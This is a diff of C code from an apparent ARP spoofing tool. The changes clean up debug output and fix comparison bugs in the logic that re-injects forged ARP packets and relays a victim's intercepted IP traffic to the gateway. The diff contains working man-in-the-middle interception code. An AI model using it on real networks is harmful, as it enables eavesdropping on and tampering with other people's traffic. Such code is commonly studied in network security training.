@@ -56,9 +56,11 @@ int get_packet(int size, const uint8_t* packet, Session* session, pcap_t* handle
                 //1. from sender to gateway
                 if(((get_arp->sender_ipaddr==session[i].sender_ip) && (get_arp->target_ipaddr==session[i].target_ip)) /*&& ((memcmp(get_arp->target_macaddr,broad,6)==0) )*/)
                 {
-                    printf("#######################################################\n");
+                    printf("ARP request packet from sender to gateway!!!!\n");
+                    printf("ARP re-injection!!!\n\n");
                     if (pcap_sendpacket(handle, session[i].senderpacket, sizeof(ARP_PKT) /* size */ ) != 0 )
                     {
+                        fprintf(stderr,"=================request packet from sender to gateway================\n");
                         fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
                         return -1;
                     }
@@ -66,9 +68,11 @@ int get_packet(int size, const uint8_t* packet, Session* session, pcap_t* handle
 
                 if(((get_arp->sender_ipaddr==session[i].target_ip) && (get_arp->target_ipaddr==session[i].sender_ip))/* && ((memcmp(get_arp->target_macaddr,broad,6)==0) )*/)
                 {
-                    printf("***************************************************\n");
+                    printf("ARP request packet from gateway to sender!!!!\n");
+                    printf("ARP re-injection!!!\n\n");
                     if (pcap_sendpacket(handle, session[i].senderpacket, sizeof(ARP_PKT) /* size */ ) != 0 )
                     {
+                        fprintf(stderr,"=================request packet from gateway to sender================\n");
                         fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
                         return -1;
                     }
@@ -80,29 +84,35 @@ int get_packet(int size, const uint8_t* packet, Session* session, pcap_t* handle
         {
             for(int i=0; i< session->session_count; i++)
             {
-                printf("%x\n",get_arp->sender_ipaddr);
-                printf("%x\n",session->target_ip);
+               // debuging
+               // printf("%x\n",get_arp->sender_ipaddr);
+               // printf("%x\n",session->target_ip);
+
                 if(get_arp->sender_ipaddr!=session->target_ip)
                 {
                     if ((get_arp->sender_ipaddr==arp_req[i].arp.target_ipaddr) && memcmp(get_arp->target_macaddr,arp_req->arp.sender_macaddr,6)==0)
-                    { printf("123\n");
-                        //printf("%x %x %x %x %x %x\n",get_arp->sender_macaddr[0],get_arp->sender_macaddr[1],get_arp->sender_macaddr[2],get_arp->sender_macaddr[3],get_arp->sender_macaddr[4],get_arp->sender_macaddr[5]);
+                    {
+                        // for debuging
+                        // printf("%x %x %x %x %x %x\n",get_arp->sender_macaddr[0],get_arp->sender_macaddr[1],get_arp->sender_macaddr[2],get_arp->sender_macaddr[3],get_arp->sender_macaddr[4],get_arp->sender_macaddr[5]);
                         memcpy(arp_rpy[i].arp.target_macaddr,get_arp->sender_macaddr,6);
+
                         //1. make_reply_pakcet
                         make_arp_packet(session,3,i);
-                        // printf("456\n");
-                        //2. send_reply_packet
 
+                        //2. send_reply_packet
+                        printf("ARP reply pkt for injection!!\n");
                         if (pcap_sendpacket(handle, session[i].senderpacket, sizeof(ARP_PKT) /* size */ ) != 0 )
                         {
+                            fprintf(stderr,"=================find target mac================\n");
+
                             fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
                             return -1;
                         }
                     }
                 }
-                else if(get_arp->sender_ipaddr==session->target_ip && memcpy(get_arp->target_macaddr,MY_MAC,6))
+                else if(get_arp->sender_ipaddr==session->target_ip && memcmp(get_arp->target_macaddr,MY_MAC,6)==0)
                 {
-                    printf("dfdfdfdfsdfsdfdsfsdfsdfsd\n");
+                    //find gateway mac
                     memcpy(gateMac,get_eth->eth_src,6);
                 }
             }
@@ -111,22 +121,25 @@ int get_packet(int size, const uint8_t* packet, Session* session, pcap_t* handle
     //ip packet
     else if(ntohs(get_eth->eth_type) == 0x0800)
     {
-        //1. Is is gateway ip?
-        //2. Is is
+        // condition
+        // 1. ip.src is sender ip?
+        // 2. eth.src is sender mac?
 
         for(int i=0; i< session->session_count; i++)
-        {   //printf("123\n");
-               // printf("## %x\n",get_ip->ip_srcaddr);
-               // printf("## %x\n",session[i].sender_ip);
-            if(get_ip->ip_srcaddr==session[i].sender_ip && memcpy(get_eth->eth_src,arp_rpy->arp.target_macaddr,6) )
-            {    printf("456\n");
-                memcpy(relay_pkt,packet,size);
+        {
+            if(get_ip->ip_srcaddr==session[i].sender_ip && memcmp(get_eth->eth_src,arp_rpy->arp.target_macaddr,6)==0 && memcmp(get_eth->eth_dst,MY_MAC,6)==0 )
+            {
+                //forwarding ip relay pkt
+                memcpy(relay_pkt,packet,(size_t)size);
                 memcpy(relay_pkt,gateMac,6);
                 memcpy(relay_pkt+6,MY_MAC,6);
- //printf("%x %x %x %x %x %x\n",MY_MAC[0],MY_MAC[1],MY_MAC[2],MY_MAC[3],MY_MAC[4],MY_MAC[5]);
+
+                printf("IP Packt relay!!!\n");
                 if (pcap_sendpacket(handle, relay_pkt, size /* size */ ) != 0 )
                 {
-                    fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
+                    fprintf(stderr,"=================relay packt================\n");
+
+                    fprintf(stderr,"\nError 22sending the packet: \n", pcap_geterr(handle));
                     return -1;
                 }
             }
